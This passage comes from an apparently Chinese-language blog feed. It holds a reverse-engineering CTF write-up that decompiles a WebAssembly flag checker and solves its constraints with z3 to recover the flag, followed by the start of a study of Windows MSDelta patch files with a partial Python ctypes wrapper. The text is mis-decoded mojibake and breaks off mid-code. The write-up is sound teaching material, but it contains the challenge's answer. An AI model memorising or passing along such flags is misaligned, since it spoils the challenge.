class="keyword">var</span> <span class="attr">wb</span>:int = ub;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">xb</span>:int = vb == wb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">yb</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">zb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ac</span>:int = xb &amp; zb;</span><br><span class="line">  y = yb;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(ac)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">bc</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">cc</span>:int = h[<span class="number">5</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">dc</span>:int = bc + cc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ec</span>:int = <span class="number">30</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fc</span>:int = dc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">gc</span>:int = ec;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">hc</span>:int = fc == gc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ic</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">jc</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">kc</span>:int = hc &amp; jc;</span><br><span class="line">  y = ic;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(kc)) goto B_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">lc</span>:int = h[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">mc</span>:int = h[<span class="number">4</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">nc</span>:int = lc - mc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">oc</span>:int = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pc</span>:int = nc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qc</span>:int = oc;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">rc</span>:int = pc == qc;</span><br><span class="line">  y = rc;</span><br><span class="line">  label <span class="attr">B_a</span>:</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sc</span>:int = y;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">tc</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">uc</span>:int = sc &amp; tc;</span><br><span class="line">  <span class="keyword">return</span> uc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">checker</span>(<span class="params">a:int, b:int</span>):int &#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">c</span>:int = g_a;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">d</span>:int = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">e</span>:int = c - d;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">f</span>:int_ptr = e;</span><br><span class="line">  g_a = e;</span><br><span class="line">  f[<span class="number">7</span>] = a;</span><br><span class="line">  f[<span class="number">6</span>] = b;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">g</span>:int = f[<span class="number">6</span>];</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">h</span>:int = e;</span><br><span class="line">  f[<span class="number">5</span>] = h;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">i</span>:int = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">j</span>:int = g &lt;&lt; i;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">k</span>:int = <span class="number">15</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">l</span>:int = j + k;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">m</span>:int = -<span class="number">16</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">n</span>:int = l &amp; m;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">o</span>:int = e;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">p</span>:&#123; <span class="attr">a</span>:int, <span class="attr">b</span>:int, <span class="attr">c</span>:int, <span class="attr">d</span>:int, <span class="attr">e</span>:int, <span class="attr">f</span>:int, <span class="attr">g</span>:int, <span class="attr">h</span>:int, <span class="attr">i</span>:int, <span class="attr">j</span>:int, <span class="attr">k</span>:int, <span class="attr">l</span>:int &#125; = </span><br><span class="line">    o - n;</span><br><span class="line">  e = p;</span><br><span class="line">  g_a = e;</span><br><span class="line">  f[<span class="number">4</span>] = g;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">q</span>:int = <span class="number">0</span>;</span><br><span class="line">  f[<span class="number">3</span>] = q;</span><br><span class="line">  loop L_b &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">r</span>:int = f[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">s</span>:int = f[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">t</span>:int = r;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">u</span>:int = s;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">v</span>:int = t &lt; u;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">w</span>:int = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">x</span>:int = v &amp; w;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">eqz</span>(x)) goto B_a;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">y</span>:int = f[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">z</span>:int = f[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">aa</span>:ubyte_ptr = y + z;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ba</span>:int = aa[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ca</span>:int = <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">da</span>:int = ba &lt;&lt; ca;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ea</span>:int = da &gt;&gt; ca;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">fa</span>:int = <span class="number">97</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ga</span>:int = ea - fa;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ha</span>:int = f[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ia</span>:int = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ja</span>:int = ha &lt;&lt; ia;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ka</span>:int_ptr = p + ja;</span><br><span class="line">    ka[<span class="number">0</span>] = ga;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">la</span>:int = f[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">ma</span>:int = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="attr">na</span>:int = la + ma;</span><br><span class="line">    f[<span class="number">3</span>] = na;</span><br><span class="line">    <span class="keyword">continue</span> L_b;</span><br><span class="line">  &#125;</span><br><span class="line">  unreachable;</span><br><span class="line">  label <span class="attr">B_a</span>:</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">oa</span>:int = p.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">pa</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">qa</span>:int = pa;</span><br><span class="line">  <span class="keyword">if</span> (oa) goto B_c;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ra</span>:int = p.<span class="property">i</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">sa</span>:int = <span class="number">0</span>;</span><br><span class="line">  qa = sa;</span><br><span class="line">  <span class="keyword">if</span> (ra) goto B_c;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ta</span>:int = p.<span class="property">l</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ua</span>:int = <span class="number">0</span>;</span><br><span class="line">  qa = ua;</span><br><span class="line">  <span class="keyword">if</span> (ta) goto B_c;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">va</span>:int = p.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">wa</span>:int = p.<span class="property">c</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">xa</span>:int = p.<span class="property">d</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ya</span>:int = p.<span class="property">e</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">za</span>:int = <span class="title function_">f_b</span>(va, wa, xa, ya);</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ab</span>:int = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">bb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">cb</span>:int = za &amp; bb;</span><br><span class="line">  qa = ab;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">eqz</span>(cb)) goto B_c;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">db</span>:int = p.<span class="property">f</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">eb</span>:int = p.<span class="property">g</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">fb</span>:int = p.<span class="property">h</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">gb</span>:int = p.<span class="property">j</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">hb</span>:int = p.<span class="property">k</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ib</span>:int = <span class="title function_">f_c</span>(db, eb, fb, gb, hb);</span><br><span class="line">  qa = ib;</span><br><span class="line">  label <span class="attr">B_c</span>:</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">jb</span>:int = qa;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">kb</span>:int = f[<span class="number">5</span>];</span><br><span class="line">  e = kb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">lb</span>:int = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">mb</span>:int = jb &amp; lb;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">nb</span>:int = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="attr">ob</span>:int = f + nb;</span><br><span class="line">  g_a = ob;</span><br><span class="line">  <span class="keyword">return</span> mb;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>(è¿™é‡Œåªç»™å‡ºæœ€é‡è¦çš„é€»è¾‘) è¿›ä¸€æ­¥åˆå¹¶ç²¾ç®€ä»£ç å¾—åˆ°ä»¥ä¸‹é€»è¾‘:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">global</span> <span class="attr">g_a</span>:int = <span class="number">65536</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_b</span>:int = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_c</span>:int = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">global</span> <span class="attr">g_d</span>:int = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">#include &lt;stdbool.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line">struct &#123;</span><br><span class="line">    int a;</span><br><span class="line">    int b;</span><br><span class="line">    int c;</span><br><span class="line">    int d;</span><br><span class="line">&#125; g;</span><br><span class="line"></span><br><span class="line">int <span class="title function_">f_b</span>(<span class="params">int p.a, int p.c, int p.d, int p.e</span>) &#123;</span><br><span class="line">    int temp = offset_65392; <span class="comment">// ç®—å®Œå­—æ¯åç§»ååç§»å­˜æ”¾çš„åœ°æ–¹</span></span><br><span class="line">    int f = <span class="number">16</span>;</span><br><span class="line">    g_d = p.<span class="property">a</span>;</span><br><span class="line">    g_c = p.<span class="property">c</span>;</span><br><span class="line">    g_b = p.<span class="property">d</span>;</span><br><span class="line">    g_a = p.<span class="property">e</span>;</span><br><span class="line">    bool l = g_d == <span class="number">22</span>;</span><br><span class="line">    int o = l &amp; <span class="number">1</span>;</span><br><span class="line">    bool z = g_c + g_b == <span class="number">30</span>;                <span class="comment">//p[2] + p[3] == 30</span></span><br><span class="line">    int ja = g_b * g_a == <span class="number">168</span>;                <span class="comment">//p[3] * p[4] == 168</span></span><br><span class="line">    int ua = g_d + g_c + g_b + g_a == <span class="number">66</span>;    <span class="comment">//p[0] + p[2] + p[3] + p[4] == 66</span></span><br><span class="line">    int va = ua &amp; (ja &amp; (z &amp; o));    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> va &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">&gt;&gt;&gt; a = <span class="title class_">Int</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; c = <span class="title class_">Int</span>(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; d = <span class="title class_">Int</span>(<span class="string">&quot;d&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; e = <span class="title class_">Int</span>(<span class="string">&quot;e&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; s = <span class="title class_">Solver</span>()</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">add</span>(a == <span class="number">22</span>)</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">add</span>(c + d == <span class="number">30</span>)</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">add</span>(d * e == <span class="number">168</span>)</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">add</span>(a + c + d + e == <span class="number">66</span>)</span><br><span class="line">&gt;&gt;&gt; s.<span class="title function_">check</span>()</span><br><span class="line">sat</span><br><span class="line">&gt;&gt;&gt; m = s.<span class="title function_">model</span>()</span><br><span class="line">&gt;&gt;&gt; m</span><br><span class="line">[a = <span class="number">22</span>, d = <span class="number">12</span>, c = <span class="number">18</span>, e = <span class="number">14</span>]</span><br><span class="line"><span class="comment">//p[0] == &#x27;w&#x27;, p[2] == &quot;s&quot;, p[3] == &quot;m&quot;, p[4] == &quot;o&quot;</span></span><br><span class="line"></span><br><span class="line">#include &lt;stdbool.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line">struct &#123;</span><br><span class="line">    int a;</span><br><span class="line">    int b;</span><br><span class="line">    int c;</span><br><span class="line">    int d;</span><br><span class="line">    int e;</span><br><span class="line">&#125; g;</span><br><span class="line"></span><br><span class="line">int <span class="title function_">f_c</span>(<span class="params">p.f, p.g, p.h, p.j, p.k</span>) &#123;</span><br><span class="line">    int* h = &amp;g.<span class="property">a</span> - <span class="number">32</span>;</span><br><span class="line">    f = p.<span class="property">f</span>;</span><br><span class="line">    g = p.<span class="property">g</span>;</span><br><span class="line">    h = p.<span class="property">h</span>;</span><br><span class="line">    j = p.<span class="property">j</span>;</span><br><span class="line">    k = p.<span class="property">k</span>;</span><br><span class="line">    bool u = k + j + h + g + f == <span class="number">71</span>;</span><br><span class="line">    <span class="keyword">if</span> (u) goto B_a;</span><br><span class="line">    bool la = f * g * h * j * k == <span class="number">449280</span>;</span><br><span class="line">    <span class="keyword">if</span> (la) goto B_a;</span><br><span class="line">    bool za = f * f + g * g == <span class="number">724</span>;</span><br><span class="line">    <span class="keyword">if</span> (za) goto B_a;</span><br><span class="line">    bool pb = h * h + j * j == <span class="number">313</span>;</span><br><span class="line">    <span class="keyword">if</span> (pb) goto B_a;</span><br><span class="line">    bool xb = k * k == <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> (xb) goto B_a;</span><br><span class="line">    bool gc = f + h == <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span> (gc) goto B_a;</span><br><span class="line">    bool rc = f - j == <span class="number">5</span>;</span><br><span class="line">    <span class="attr">B_a</span>:</span><br><span class="line">    int uc = rc &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> uc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; g = <span class="title class_">Int</span>(<span class="string">&quot;g&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; f = <span class="title class_">Int</span>(<span class="string">&quot;f&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; h = <span class="title class_">Int</span>(<span class="string">&quot;h&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; j = <span class="title class_">Int</span>(<span class="string">&quot;j&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; k = <span class="title class_">Int</span>(<span class="string">&quot;k&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; sol = <span class="title class_">Solver</span>()</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(k + j + h + g + f == <span class="number">71</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(f * g * h * j * k == <span class="number">449280</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(f * f + g * g == <span class="number">724</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(h * h + j * j == <span class="number">313</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(k == <span class="number">8</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(f + h == <span class="number">30</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">add</span>(f - j == <span class="number">5</span>)</span><br><span class="line">&gt;&gt;&gt; sol.<span class="title function_">check</span>()</span><br><span class="line">sat</span><br><span class="line">&gt;&gt;&gt; m = sol.<span class="title function_">model</span>()</span><br><span class="line">&gt;&gt;&gt; m</span><br><span class="line">[k = <span class="number">8</span>, f = <span class="number">18</span>, j = <span class="number">13</span>, g = <span class="number">20</span>, h = <span class="number">12</span>]</span><br><span class="line"><span class="comment">//p[5] == &quot;s&quot;, p[6] == &quot;u&quot;, p[7] == &quot;m&quot;, p[9] == &quot;n&quot;, p[10] == &quot;i&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int <span class="title function_">checker</span>(<span class="params">int base, int lenth</span>) &#123;</span><br><span class="line">    int* f = offset_65440;</span><br><span class="line">    g_a = offset_65440;</span><br><span class="line">    f[<span class="number">7</span>] = base_65472;</span><br><span class="line">    int h = offset_65440;</span><br><span class="line">    f[<span class="number">5</span>] = h;</span><br><span class="line">    int n = ((lenth &lt;&lt; <span class="number">2</span>) + <span class="number">15</span>) &amp; 0b.... <span class="number">1111</span> <span class="number">0000</span>;</span><br><span class="line">    int o = offset_65440;</span><br><span class="line">    struct &#123;</span><br><span class="line">        int a;</span><br><span class="line">        int b;</span><br><span class="line">        int c;</span><br><span class="line">        int d;</span><br><span class="line">        int e;</span><br><span class="line">        int f;</span><br><span class="line">        int g;</span><br><span class="line">        int h;</span><br><span class="line">        int i;</span><br><span class="line">        int j;</span><br><span class="line">        int k;</span><br><span class="line">        int l;</span><br><span class="line">    &#125; p = &#123;offset_65392&#125;;</span><br><span class="line">    g_a = offset_65392;</span><br><span class="line">    f[<span class="number">4</span>] = lenth;</span><br><span class="line">    int q = <span class="number">0</span>;</span><br><span class="line">    offset_input = q;</span><br><span class="line">    <span class="keyword">while</span> (offset_input &lt; lenth) &#123;</span><br><span class="line">        int now_char = *(f[<span class="number">7</span>] + offset_input);</span><br><span class="line">        p[offset_input &lt;&lt; <span class="number">2</span>] = now_char - <span class="number">97</span>;</span><br><span class="line">        offset_input += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘â†‘</span></span><br><span class="line">    <span class="comment">//å–æ¯ä½å­—æ¯å¯¹&#x27;a&#x27;çš„åç§»</span></span><br><span class="line">    <span class="comment">//===========================</span></span><br><span class="line"></span><br><span class="line">    int qa = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (p.<span class="property">b</span> == <span class="number">0</span>) &#123;                                        <span class="comment">//input[1]  == &#x27;a&#x27;</span></span><br><span class="line">        qa = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (!p.<span class="property">i</span> == <span class="number">0</span>) &#123;                                <span class="comment">//input[8]  == &#x27;a&#x27;</span></span><br><span class="line">            qa = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (!p.<span class="property">l</span>) &#123;                                    <span class="comment">//input[11] == &#x27;a&#x27;</span></span><br><span class="line">                int cb = <span class="title function_">f_b</span>(p.<span class="property">a</span>, p.<span class="property">c</span>, p.<span class="property">d</span>, p.<span class="property">e</span>) &amp; <span class="number">1</span>;</span><br><span class="line">                qa = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (cb == <span class="number">1</span>) &#123;</span><br><span class="line">                    qa = <span class="title function_">f_c</span>(p.<span class="property">f</span>, p.<span class="property">g</span>, p.<span class="property">h</span>, p.<span class="property">j</span>, p.<span class="property">k</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset_65392 =&gt; offset_65440;</span><br><span class="line">    g_a = offset_65472;</span><br><span class="line">    <span class="keyword">return</span> qa &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// p[5] == &quot;s&quot;, p[6] == &quot;u&quot;, p[7] == &quot;m&quot;, p[9] == &quot;n&quot;, p[10] == &quot;i&quot;</span></span><br><span class="line"><span class="comment">// p[0] == &#x27;w&#x27;, p[2] == &quot;s&quot;, p[3] == &quot;m&quot;, p[4] == &quot;o&quot;</span></span><br><span class="line"><span class="comment">// osu&#123;wasmosumania&#125;</span></span><br></pre></td></tr></table></figure>

<p>éƒ¨åˆ†é€»è¾‘è¦æ˜¯ä¸ç¡®å®šå¯ä»¥å†ä½¿ç”¨è°ƒè¯•åŠŸèƒ½è¿›è¡ŒçŒœæƒ³éªŒè¯ è€Œwasmä¸­çš„loadæŒ‡ä»¤æŒ‡çš„æ˜¯ä»memoriesä¸­å–å‡ºæ•°æ® ä¾‹å¦‚:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/04/20240304-195435.png" alt="image-20240304195435263"></p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/03/04/20240304-195539.png" alt="image-20240304195538986" style="zoom:50%;" />
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Writeups</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowså·®å¼‚åŒ–è¡¥ä¸MSDeltaä¹‹ç ”ç©¶</title>
    <url>/2024/04/29/Windows%E5%B7%AE%E5%BC%82%E5%8C%96%E8%A1%A5%E4%B8%81MSDelta%E4%B9%8B%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p><code>msdelta.dll</code>åŒ…å«äº†ä¸€ç³»åˆ—ç”¨äºå¯¹æ–‡ä»¶è¿›è¡Œè¡¥ä¸æ“ä½œçš„API é‰´äºç½‘ä¸Šèµ„æ–™æå°‘ä¸”<a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/msdelta">å®˜æ–¹æ–‡æ¡£</a>ç®€é™‹ è®°å½•ä¸€ä¸‹å­¦ä¹ è¿‡ç¨‹</p>
<span id="more"></span>

<h2 id="Patch-è¡¥ä¸"><a href="#Patch-è¡¥ä¸" class="headerlink" title="Patch(è¡¥ä¸)"></a>Patch(è¡¥ä¸)</h2><p>å¯¹äº<code>msdelta.dll</code>ä¸­çš„Patch å®ƒä¸ºä¸€ä¸ªå­—èŠ‚æµ äº§ç”Ÿäºä¸€ä¸ªåŸå­—èŠ‚æµ<code>Source</code>å’Œç›®æ ‡å­—èŠ‚æµ<code>Target</code> å¯ä»¥ç”¨è¿™ä¸ª<a href="https://github.com/ritsec/RITSEC-CTF-2019/blob/master/Misc/patch-tuesday/make_delta.py">Python wrapper</a>æ¥äº§ç”Ÿä¸€ä¸ªä»æºæ–‡ä»¶åˆ°ç›®æ ‡æ–‡ä»¶çš„è¡¥ä¸æ–‡ä»¶</p>
<p>æ•´ä½“ä¸Šå®ƒè®°å½•äº†è¡¥ä¸å‰åå†…å®¹çš„å·®å¼‚ ä¸€ä¸ªå¯¹<code>Delta_Patch</code>ç»“æ„ä½“åŒ…å«ä¿¡æ¯çš„æè¿°å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DELTA_HEADER_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/** Used file type set. */</span></span><br><span class="line">    DELTA_FILE_TYPE FileTypeSet;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Source file type. */</span></span><br><span class="line">    DELTA_FILE_TYPE FileType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Delta flags. */</span></span><br><span class="line">    DELTA_FLAG_TYPE Flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Size of target file in bytes. */</span></span><br><span class="line">    SIZE_T  TargetSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Time of target file. */</span></span><br><span class="line">    FILETIME TargetFileTime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Algorithm used for hashing. */</span></span><br><span class="line">    ALG_ID TargetHashAlgId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Target hash. */</span></span><br><span class="line">    DELTA_HASH TargetHash;</span><br><span class="line"></span><br><span class="line">&#125; DELTA_HEADER_INFO;</span><br></pre></td></tr></table></figure>

<p>ç”¨è¿™ä¸ªWrapperå¯ä»¥æ–¹ä¾¿åœ°æ‰§è¡Œè·å–è¡¥ä¸ä¿¡æ¯å’Œæ‰“è¡¥ä¸çš„æ“ä½œ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">HANDLE = ctypes.c_void_p</span><br><span class="line">HMODULE = HANDLE</span><br><span class="line">LPCSTR = LPSTR = ctypes.c_char_p</span><br><span class="line">BOOL = ctypes.c_long</span><br><span class="line">BYTE = ctypes.c_ubyte</span><br><span class="line">SIZE_T = ctypes.c_size_t</span><br><span class="line">DWORD = ctypes.c_ulong</span><br><span class="line">ULONG = ctypes.c_ulong</span><br><span class="line">ALG_ID = ctypes.c_ulong</span><br><span class="line">LPBUFFER = ctypes.POINTER(ctypes.c_char)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this is the Win32 Epoch time for when Unix Epoch time started. It is in</span></span><br><span class="line"><span class="comment"># hundreds of nanoseconds.</span></span><br><span class="line">EPOCH_AS_FILETIME = <span class="number">116444736000000000</span></span><br><span class="line"><span class="comment"># This is the divider/multiplier for converting nanoseconds to</span></span><br><span class="line"><span class="comment"># seconds and vice versa</span></span><br><span class="line">HUNDREDS_OF_NANOSECONDS = <span class="number">10000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FILETIME</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [(<span class="string">&quot;dwLowDateTime&quot;</span>, DWORD),</span><br><span class="line">                (<span class="string">&quot;dwHighDateTime&quot;</span>, DWORD)]</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unix_epoch_seconds</span>(<span class="params">self</span>):</span><br><span class="line">        val = (self.dwHighDateTime &lt;&lt; <span class="number">32</span>) + self.dwLowDateTime</span><br><span class="line">        <span class="keyword">return</span> (val - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        dt = datetime.datetime.utcfromtimestamp(self.unix_epoch_seconds)</span><br><span class="line">        <span class="keyword">return</span> dt.strftime(<span class="string">&#x27;%c&#x27;</span>)</span><br><span class="line">_FILETIME = FILETIME</span><br><span class="line">PFILETIME = ctypes.POINTER(_FILETIME)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RaiseIfZero</span>(<span class="params">result, func = <span class="literal">None</span>, arguments = (<span class="params"></span>)</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># HMODULE WINAPI LoadLibrary(</span></span><br><span class="line"><span class="comment">#   _In_ LPCTSTR lpFileName</span></span><br><span class="line"><span class="comment"># );</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> 